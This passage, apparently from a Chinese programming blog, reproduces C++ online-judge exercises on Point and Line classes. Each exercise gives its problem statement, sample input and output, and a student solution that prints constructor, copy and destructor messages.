    Point(const Point&amp; p)&#123;x=p.x;y=p.y; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is copied.&quot; &lt;&lt; endl;  &#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (0, 0)&quot; &lt;&lt; endl;&#125;
     ~Point ()  &#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is erased.&quot; &lt;&lt; endl;&#125;  
&#125;;
class Line&#123;
    friend class Point;
public:
    Point p1,p2;
    Line(Point &amp;p,Point &amp;q):p1(p),p2(q)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Line(double x1,double y1,double x2,double y2):p1(x1,y1),p2(x2,y2)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Line()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
////////////////////////////////
int main()
&#123;
    char c;
    int num, i;
    double x1, x2, y1, y2;
    Point p(1, -2), q(2, -1), t;
    t.show();
    std::cin&gt;&gt;num;
    for(i = 1; i &lt;= num; i++)
    &#123;
        std::cout&lt;&lt;&quot;=========================\n&quot;;
        std::cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;
        Line line(x1, y1, x2, y2);
        line.show();
    &#125;
    std::cout&lt;&lt;&quot;=========================\n&quot;;
    Line l1(p, q), l2(p, t), l3(q, t), l4(t, q);
    l1.show();
    l2.show();
    l3.show();
    l4.show();
&#125;</code></pre>
<h3 id="20-平面上的点和线——Point类、Line类-IV"><a href="#20-平面上的点和线——Point类、Line类-IV" class="headerlink" title="20.平面上的点和线——Point类、Line类 (IV)"></a>20.平面上的点和线——Point类、Line类 (IV)</h3><blockquote>
<h2 id="Description-19"><a href="#Description-19" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定，两点确定一条线段。现在我们封装一个“Point类”和“Line类”来实现平面上的点的操作。</p>
<p>根据“append.cc”，完成Point类和Line类的构造方法和show()方法，输出各Line对象和Point对象的构造和析构次序。</p>
<p>接口描述：</p>
<p>Point::show()方法：按格式输出Point对象。</p>
<p>Line::show()方法：按格式输出Line对象。</p>
<h2 id="Input-19"><a href="#Input-19" class="headerlink" title="Input"></a>Input</h2><p>输入的第一行为N，表示后面有N行测试样例。</p>
<p>每行为两组坐标“x,y”，分别表示线段起点和终点的x坐标和y坐标，两组坐标间用一个空格分开，x和y的值都在double数据范围内。</p>
<h2 id="Output-19"><a href="#Output-19" class="headerlink" title="Output"></a>Output</h2><p>输出为多行，每行为一条线段，起点坐标在前终点坐标在后，每个点的X坐标在前，Y坐标在后，Y坐标前面多输出一个空格，用括号包裹起来。输出格式见sample。</p>
<p>C语言的输入输出被禁用。</p>
<h2 id="Sample-Input-19"><a href="#Sample-Input-19" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>0,0 1,1</p>
<p>1,1 2,3</p>
<p>2,3 4,5</p>
<p>0,1 1,0</p>
<h2 id="Sample-Output-19"><a href="#Sample-Output-19" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, -2) is created.Point : (2, -1) is created.Point : (0, 0) is created.Point : (0, 0)Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.=========================Line : (0, 0) to (1, 1)=========================Line : (1, 1) to (2, 3)=========================Line : (2, 3) to (4, 5)=========================Line : (0, 1) to (1, 0)=========================Point : (1, -2) is copied.Point : (2, -1) is copied.Line : (1, -2) to (2, -1) is created.Point : (1, -2) is copied.Point : (0, 0) is copied.Line : (1, -2) to (0, 0) is created.Point : (2, -1) is copied.Point : (0, 0) is copied.Line : (2, -1) to (0, 0) is created.Point : (0, 0) is copied.Point : (2, -1) is copied.Line : (0, 0) to (2, -1) is created.Line : (1, -2) to (2, -1)Line : (1, -2) to (0, 0)Line : (2, -1) to (0, 0)Line : (0, 0) to (2, -1)Line : (0, 0) to (2, -1) is erased.Point : (2, -1) is erased.Point : (0, 0) is erased.Line : (2, -1) to (0, 0) is erased.Point : (0, 0) is erased.Point : (2, -1) is erased.Line : (1, -2) to (0, 0) is erased.Point : (0, 0) is erased.Point : (1, -2) is erased.Line : (1, -2) to (2, -1) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.Line : (0, 1) to (1, 0) is erased.Point : (1, 0) is erased.Point : (0, 1) is erased.Line : (2, 3) to (4, 5) is erased.Point : (4, 5) is erased.Point : (2, 3) is erased.Line : (1, 1) to (2, 3) is erased.Point : (2, 3) is erased.Point : (1, 1) is erased.Line : (0, 0) to (1, 1) is erased.Point : (1, 1) is erased.Point : (0, 0) is erased.Point : (0, 0) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.</p>
<h2 id="HINT-19"><a href="#HINT-19" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-19"><a href="#Append-Code-19" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1330&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Point&#123;
    friend class Line;
public:
    double x,y;
    Point()&#123;x=y=0;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(const Point&amp; p)&#123;x=p.x;y=p.y; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is copied.&quot; &lt;&lt; endl;  &#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (0, 0)&quot; &lt;&lt; endl;&#125;
     ~Point ()  &#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is erased.&quot; &lt;&lt; endl;&#125;  
&#125;;
class Line&#123;
    friend class Point;
public:
    Point p1,p2;
    Line():p1(0,0),p2(0,0)&#123;cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;p1.x&lt;&lt;&quot;, &quot;&lt;&lt;p1.y&lt;&lt;&quot;) to (&quot;&lt;&lt;p2.x&lt;&lt;&quot;, &quot;&lt;&lt;p2.y&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;&#125;
    Line(Point &amp;p,Point &amp;q):p1(p),p2(q)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Line(double x1,double y1,double x2,double y2):p1(x1,y1),p2(x2,y2)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Line()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    void SetLine(double a,double b,double c,double d)  
    &#123;  
        p1.x = a;  
        p1.y = b;  
        p2.x = c;  
        p2.y = d;  
    &#125;  
&#125;;
//////////////////////////////
int main()
&#123;
    char c;
    int num, i;
    double x1, x2, y1, y2;
    Point p(1, -2), q(2, -1), t;
    t.show();
    std::cin&gt;&gt;num;
    Line line[num];
    for(i = 0; i &lt; num; i++)
    &#123;
        std::cout&lt;&lt;&quot;=========================\n&quot;;
        std::cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;
        line[i].SetLine(x1, y1, x2, y2);
        line[i].show();
    &#125;
    std::cout&lt;&lt;&quot;=========================\n&quot;;
    Line l1(p, q), l2(p, t), l3(q, t), l4(t, q);
    l1.show();
    l2.show();
    l3.show();
    l4.show();
&#125;</code></pre>
<h3 id="21-平面上的点和线——Point类、Line类-V"><a href="#21-平面上的点和线——Point类、Line类-V" class="headerlink" title="21.平面上的点和线——Point类、Line类 (V)"></a>21.平面上的点和线——Point类、Line类 (V)</h3><blockquote>
<h2 id="Description-20"><a href="#Description-20" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定，两点确定一条线段。现在我们封装一个“Point类”和“Line类”来实现平面上的点的操作。</p>
<p>根据“append.cc”，完成Point类和Line类的构造方法和show()方法，输出各Line对象和Point对象的构造和析构次序。</p>
<p>接口描述：</p>
<p>Point::show()方法：按格式输出Point对象。</p>
<p>Line::show()方法：按格式输出Line对象。</p>
<p>Line::SetLine(double, double, double, double)方法：设置Line对象起点的x,y坐标（第一个和第二参数）和终点的x,y坐标（第三个和第四个坐标），并返回本对象</p>
<p>Line::SetLine(const Point &amp;, const Point &amp;)方法：设置Line对象的起点（第一个参数）和终点（第二个坐标），并返回本对象</p>
<p>Line::SetLine(const Line&amp;)方法：设置Line对象，复制参数的坐标，并返回本对象</p>
<p>Line::readLine()方法：从标准输入上读入坐标，格式见Sample</p>
<h2 id="Input-20"><a href="#Input-20" class="headerlink" title="Input"></a>Input</h2><p>输入的第一行为N，表示后面有N行测试样例。</p>
<p>每行为两组坐标“x,y”，分别表示线段起点和终点的x坐标和y坐标，两组坐标间用一个空格分开，x和y的值都在double数据范围内。</p>
<h2 id="Output-20"><a href="#Output-20" class="headerlink" title="Output"></a>Output</h2><p>输出为多行，每行为一条线段，起点坐标在前终点坐标在后，每个点的X坐标在前，Y坐标在后，Y坐标前面多输出一个空格，用括号包裹起来。输出格式见sample。</p>
<p>C语言的输入输出被禁用。</p>
<h2 id="Sample-Input-20"><a href="#Sample-Input-20" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>0,0 1,1</p>
<p>1,1 2,3</p>
<p>2,3 4,5</p>
<p>0,1 1,0</p>
<h2 id="Sample-Output-20"><a href="#Sample-Output-20" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, -2) is created.Point : (2, -1) is created.Point : (0, 0) is created.Point : (0, 0)Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Line : (0, 0) to (1, 1)Line : (1, 1) to (2, 3)Line : (2, 3) to (4, 5)Line : (0, 1) to (1, 0)Point : (1, -2) is copied.Point : (2, -1) is copied.Line : (1, -2) to (2, -1) is created.Point : (1, -2) is copied.Point : (0, 0) is copied.Line : (1, -2) to (0, 0) is created.Point : (2, -1) is copied.Point : (0, 0) is copied.Line : (2, -1) to (0, 0) is created.Point : (1, -2) is copied.Point : (2, -1) is copied.Line : (1, -2) to (2, -1) is copied.Line : (1, -2) to (2, -1)Line : (1, -2) to (2, -1)Line : (2, -1) to (0, 0)Line : (0, 0) to (2, -1)Line : (0, 0) to (2, -1) is erased.Point : (2, -1) is erased.Point : (0, 0) is erased.Line : (2, -1) to (0, 0) is erased.Point : (0, 0) is erased.Point : (2, -1) is erased.Line : (1, -2) to (2, -1) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.Line : (1, -2) to (2, -1) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.Line : (0, 1) to (1, 0) is erased.Point : (1, 0) is erased.Point : (0, 1) is erased.Line : (2, 3) to (4, 5) is erased.Point : (4, 5) is erased.Point : (2, 3) is erased.Line : (1, 1) to (2, 3) is erased.Point : (2, 3) is erased.Point : (1, 1) is erased.Line : (0, 0) to (1, 1) is erased.Point : (1, 1) is erased.Point : (0, 0) is erased.Point : (0, 0) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.</p>
<h2 id="HINT-20"><a href="#HINT-20" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-20"><a href="#Append-Code-20" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1331&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Point&#123;
    friend class Line;
public:
    double x,y;
    Point()&#123;x=y=0;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(const Point&amp; p)&#123;x=p.x;y=p.y; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is copied.&quot; &lt;&lt; endl;  &#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (0, 0)&quot; &lt;&lt; endl;&#125;
     ~Point ()  &#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is erased.&quot; &lt;&lt; endl;&#125;  
&#125;;
class Line&#123;
    friend class Point;
public:
    Point p1,p2;
    Line():p1(0,0),p2(0,0)&#123;cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;p1.x&lt;&lt;&quot;, &quot;&lt;&lt;p1.y&lt;&lt;&quot;) to (&quot;&lt;&lt;p2.x&lt;&lt;&quot;, &quot;&lt;&lt;p2.y&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;&#125;
    Line(Point &amp;p,Point &amp;q):p1(p),p2(q)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Line(double x1,double y1,double x2,double y2):p1(x1,y1),p2(x2,y2)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Line()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    void readLine()&#123;
        double x1, y1, x2, y2;  
        char c;  
        cin &gt;&gt; x1 &gt;&gt; c &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; c &gt;&gt; y2;  
        SetLine(x1, y1, x2, y2);  

    &#125;
    Line&amp; SetLine(double a,double b,double c,double d)  
    &#123;  
        p1.x = a;  
        p1.y = b;  
        p2.x = c;  
        p2.y = d;
        return *this;  
    &#125;  
    Line&amp; setLine(const Point&amp; p, const Point&amp; q)&#123;
        p1.x = p.x;  
        p1.y = p.y;  
        p2.x = q.x;  
        p2.y = q.y;
        return *this;         
    &#125;
    Line&amp; setLine(const Line&amp; l)&#123;
        p1.x = l.p1.x;  
        p1.y = l.p1.y;  
        p2.x = l.p2.x;  
        p2.y = l.p2.y;
        return *this;         
    &#125;
&#125;;
/////////////////////////
int main()
&#123;
    int num, i;
    Point p(1, -2), q(2, -1), t;
    t.show();
    std::cin&gt;&gt;num;
    Line line[num];
    for(i = 0; i &lt; num; i++)
    &#123;
        line[i].readLine();
        line[i].show();
    &#125;
    Line l1(p, q), l2(p,t), l3(q,t), l4(l1);
    l1.show();
    l2.setLine(l1).show();
    l3.show();
    l4.setLine(t,q).show();
&#125;</code></pre>
<h3 id="22-平面上的点和线——Point类、Line类-VI"><a href="#22-平面上的点和线——Point类、Line类-VI" class="headerlink" title="22.平面上的点和线——Point类、Line类 (VI)"></a>22.平面上的点和线——Point类、Line类 (VI)</h3><blockquote>
<h2 id="Description-21"><a href="#Description-21" class="headerlink" title="Description"></a>Description</h2><p>在数学上，平面直角坐标系上的点用X轴和Y轴上的两个坐标值唯一确定，两点确定一条线段。现在我们封装一个“Point类”和“Line类”来实现平面上的点的操作。</p>
<p>根据“append.cc”，完成Point类和Line类的构造方法和show()方法，输出各Line对象和Point对象的构造和析构次序。</p>
<p>接口描述：</p>
<p>Point::show()方法：按格式输出Point对象。</p>
<p>Point::x()方法：取x坐标。</p>
<p>Point::y()方法：取y坐标。</p>
<p>Line::show()方法：按格式输出Line对象。</p>
<p>Line::SetLine(double, double, double, double)方法：设置Line对象起点的x,y坐标（第一个和第二参数）和终点的x,y坐标（第三个和第四个坐标），并返回本对象</p>
<p>Line::SetLine(const Point &amp;, const Point &amp;)方法：设置Line对象的起点（第一个参数）和终点（第二个坐标），并返回本对象</p>
<p>Line::SetLine(const Line&amp;)方法：设置Line对象，复制参数的坐标，并返回本对象</p>
<p>Line::readLine()方法：从标准输入上读入坐标，格式见Sample</p>
<p>Line::start()方法：取Line的起点</p>
<p>Line::end()方法：取Line的终点</p>
<p>Line::setStart()方法：设置Line的起点</p>
<p>Line::setEnd()方法：设置Line的终点</p>
<p>以下三个函数用于输出Line对象，格式同sample</p>
<p>showLineCoordinate(const Line&amp;)</p>
<p>showLinePoint(const Line&amp;)</p>
<p>showLine(const Line&amp;)</p>
<h2 id="Input-21"><a href="#Input-21" class="headerlink" title="Input"></a>Input</h2><p>输入的第一行为N，表示后面有N行测试样例。</p>
<p>每行为两组坐标“x,y”，分别表示线段起点和终点的x坐标和y坐标，两组坐标间用一个空格分开，x和y的值都在double数据范围内。</p>
<h2 id="Output-21"><a href="#Output-21" class="headerlink" title="Output"></a>Output</h2><p>输出为多行，每行为一条线段，起点坐标在前终点坐标在后，每个点的X坐标在前，Y坐标在后，Y坐标前面多输出一个空格，用括号包裹起来。输出格式见sample。</p>
<p>C语言的输入输出被禁用。</p>
<h2 id="Sample-Input-21"><a href="#Sample-Input-21" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>40,0 1,11,1 2,32,3 4,50,1 1,0</p>
<h2 id="Sample-Output-21"><a href="#Sample-Output-21" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, -2) is created.Point : (2, -1) is created.Point : (0, 0) is created.Point : (0, 0)Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Line : (0, 0) to (1, 1)Line : (1, 1) to (2, 3)Line : (2, 3) to (4, 5)Line : (0, 1) to (1, 0)Point : (1, -2) is copied.Point : (2, -1) is copied.Line : (1, -2) to (2, -1) is created.Point : (1, -2) is copied.Point : (0, 0) is copied.Line : (1, -2) to (0, 0) is created.Point : (2, -1) is copied.Point : (0, 0) is copied.Line : (2, -1) to (0, 0) is created.Point : (1, -2) is copied.Point : (2, -1) is copied.Line : (1, -2) to (2, -1) is copied.Line : (1, -2) to (2, -1)Line : Point : (1, -2) to Point : (0, 0)Line : Point : (1, -2) to Point : (2, -1)Line : (0, 0) to (2, -1)Line : (0, 0) to (2, -1) is erased.Point : (2, -1) is erased.Point : (0, 0) is erased.Line : (1, -2) to (2, -1) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.Line : (1, -2) to (0, 0) is erased.Point : (0, 0) is erased.Point : (1, -2) is erased.Line : (1, -2) to (2, -1) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.Line : (0, 1) to (1, 0) is erased.Point : (1, 0) is erased.Point : (0, 1) is erased.Line : (2, 3) to (4, 5) is erased.Point : (4, 5) is erased.Point : (2, 3) is erased.Line : (1, 1) to (2, 3) is erased.Point : (2, 3) is erased.Point : (1, 1) is erased.Line : (0, 0) to (1, 1) is erased.Point : (1, 1) is erased.Point : (0, 0) is erased.Line : (0, 0) to (2, -1) is erased.Point : (2, -1) is erased.Point : (0, 0) is erased.Point : (0, 0) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.</p>
<h2 id="HINT-21"><a href="#HINT-21" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-21"><a href="#Append-Code-21" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1332&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;  
using namespace std;  
#include &lt;iomanip&gt;  
class Point&#123;  
private:  
    double x_,y_;  
    friend class Line;  
public:  
    Point(double x,double y)  
    &#123;  
        x_ = x;  
        y_ = y;  
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;  
    &#125;  
    Point()  
    &#123;  
        x_ = 0;  
        y_ = 0;  
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;  
    &#125;  
    Point(double a):x_(a),y_(a) &#123; cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;&#125;  
    void setvalue(double xx,double yy)  
    &#123;  
        x_ = xx;  
        y_ = yy;  
    &#125;  
    //void setx(int xx) &#123;x_ = xx;&#125;  
    //void sety(int yy) &#123;y_ = yy;&#125;  
    void show()  
    &#123;  
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
    &#125;  
    double x() const &#123; return x_;&#125;  
    double y() const &#123; return y_;&#125;  
    Point(const Point &amp;p)  
    &#123;  
        x_ = p.x_;  
        y_ = p.y_;  
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is copied.&quot;&lt;&lt;endl;  
    &#125;  
    ~Point()  
    &#123;  
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is erased.&quot;&lt;&lt;endl;  
    &#125;  
    void showNoEndOfLine()const&#123;cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;)&quot;;&#125;  
&#125;;  

class Line&#123;  
private:  
    Point x1_,y1_;  
    double x1,y1,x2,y2;  
    friend class Point;  
public:  
    Line(double xx1,double yy1,double xx2,double yy2):x1_(xx1,yy1),y1_(xx2,yy2)  
    &#123;  
        cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;  
    &#125;  
    Line(Point &amp;q1,Point &amp;q2):x1_(q1),y1_(q2)  
    &#123;  
        cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;  
    &#125;  
    Line(const Line&amp;I):x1_(I.x1_),y1_(I.y1_) &#123;cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is copied.&quot;&lt;&lt;endl;&#125;  
    Line():x1_(),y1_()&#123;cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;&#125;  
    Line &amp;setLine(double xx3,double yy3,double xx4,double yy4)  
    &#123;  
        x1_.x_ = xx3;  
        x1_.y_ = yy3;  
        y1_.x_ = xx4;  
        y1_.y_ = yy4;  
        return *this;  
    &#125;  
    void show() const  
    &#123;  
        cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
    &#125;  
    ~Line()  
    &#123;  
        cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is erased.&quot;&lt;&lt;endl;  
    &#125;  
    Line &amp;setLine(const Point &amp;p1,const Point &amp;p2)  
    &#123;  
        x1_ = p1;  
        y1_ = p2;  
        return *this;  
    &#125;  
    Line &amp;setLine(const Line&amp; q)  
    &#123;  
       *this = q;  
       return *this;  
    &#125;  
    void readLine()  
    &#123;  
       double x1,y1,x2,y2;  
       char c;  
       cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;  
       x1_.x_ = x1;  
       x1_.y_ = y1;  
       y1_.x_ = x2;  
       y1_.y_ = y2;  
    &#125;  
    const Point &amp;start() const  
    &#123;  
        return x1_;  
    &#125;  
    const Point &amp;end() const  
    &#123;  
        return y1_;  
    &#125;  
    void setStart(Point &amp;c) &#123;x1_ = c;&#125;  
    void setEnd(Point &amp;e) &#123;y1_ = e;&#125;  
&#125;;  
void showLineCoordinate(const Line&amp; line)  
&#123;  
    std::cout&lt;&lt;&quot;Line : &quot;;  
